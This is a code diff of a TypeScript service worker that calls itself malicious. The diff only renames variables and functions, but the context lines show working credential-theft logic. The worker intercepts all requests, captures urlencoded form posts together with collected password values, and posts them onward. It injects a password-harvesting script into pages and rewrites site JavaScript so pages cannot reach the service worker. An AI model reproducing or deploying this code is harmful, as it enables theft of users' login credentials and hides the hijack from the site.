@@ -10,20 +10,20 @@ self.addEventListener("activate", () => {
 })
 
 
-let passwords:string[] = []
+let basicPasswords:string[] = []
 self.addEventListener('message', (event: MessageEvent) => {
     if(event.data.type == "PASSWORD_MESSAGE") {
-        passwords = event.data.payload
+        basicPasswords = event.data.payload
     }
 });
 
 // @ts-expect-error More typing annoyances
 self.addEventListener("fetch", (event: FetchEvent) => {
     console.log("Malicious service worker has intercepted the request")
-    event.respondWith(handleRequest(event.request))
+    event.respondWith(basicHandleRequest(event.request))
 })
 
-async function handleRequest(req: Request) : Promise<Response> {
+async function basicHandleRequest(req: Request) : Promise<Response> {
     if(req.method !== "GET") {
         if(req.method == "POST" && req.headers.get("Content-Type") === "application/x-www-form-urlencoded") {
             const clonedRequest = req.clone()
@@ -38,7 +38,7 @@ async function handleRequest(req: Request) : Promise<Response> {
                     body: JSON.stringify({
                         type: "x-www-form-urlencoded",
                         host: new URL(req.url).host,
-                        inputPasswords: passwords,
+                        inputPasswords: basicPasswords,
                         originalReq: Object.fromEntries([...formData.entries()])
                     })
                 })
@@ -52,9 +52,9 @@ async function handleRequest(req: Request) : Promise<Response> {
     const originalResponse = await fetch(req)
     let finalData: string
     if(req.mode === "navigate") {
-        finalData = handleHtml(await originalResponse.text())
+        finalData = basicHandleHtml(await originalResponse.text())
     } else if(originalResponse.headers.get("content-type")?.includes("javascript")) {
-        finalData = handleJs(await originalResponse.text())
+        finalData = basicHandleJs(await originalResponse.text())
     } else {
         return originalResponse
     }
@@ -69,7 +69,7 @@ async function handleRequest(req: Request) : Promise<Response> {
     return newResponse
 }
 
-function handleHtml(originalDocument: string) : string {
+function basicHandleHtml(originalDocument: string) : string {
     return originalDocument.replace("<head>", `<head>
     <script>
         function getPwdInputs() {
@@ -96,7 +96,7 @@ function handleHtml(originalDocument: string) : string {
     </script>`)
 }
 
-function handleJs(originalDocument: string) : string {
+function basicHandleJs(originalDocument: string) : string {
     return originalDocument
         // Removes any possibility of anything being called on the service worker object
         .replace(/navigator\.serviceWorker/g, "window")
